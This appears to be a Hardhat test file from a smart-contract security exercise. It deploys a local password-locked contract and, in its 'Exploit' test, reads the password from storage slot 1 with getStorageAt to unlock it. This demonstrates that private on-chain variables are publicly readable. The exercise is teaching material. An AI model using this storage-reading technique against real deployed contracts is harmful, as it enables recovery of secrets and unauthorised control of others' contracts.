const { ethers, web3 } = require("hardhat");
const { expect } = require("chai");
require("@nomiclabs/hardhat-web3");
require("dotenv").config();

const InputDataDecoder = require('ethereum-input-data-decoder');
const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "_password",
        "type": "bytes32"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ifLocked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "_password",
        "type": "bytes32"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]
const decoder = new InputDataDecoder(abi);

describe("Unlock Smart Contract", function () {
  let alice, bob;
// console.log('Ethers=========', ethers);
  before(async function () {
    [alice, bob] = await ethers.getSigners();
    const NoPrivacyFactory = await ethers.getContractFactory(
      "UnlockContract",
      alice
    );
    this.lock = await NoPrivacyFactory.deploy(process.env.PASSWORD);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // const res = decoder.decodeData(this.lock.deployTransaction.data);
    // console.log("This", this.lock.address)
    // console.log('res', res.inputs[0]);
    // console.log('REs', result);
    res = await web3.eth.getStorageAt(this.lock.address,1)
    // console.log("------>", await web3.eth.getStorageAt(this.lock.address,1))
    result = await this.lock.unlock(res);
    console.log("Passowrd--->", result);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Bob has unlocked the contract
    if (expect(await this.lock.ifLocked()).to.equal(false)) {
      console.log(`You have unlocked the Contract`)
    }
  });
});
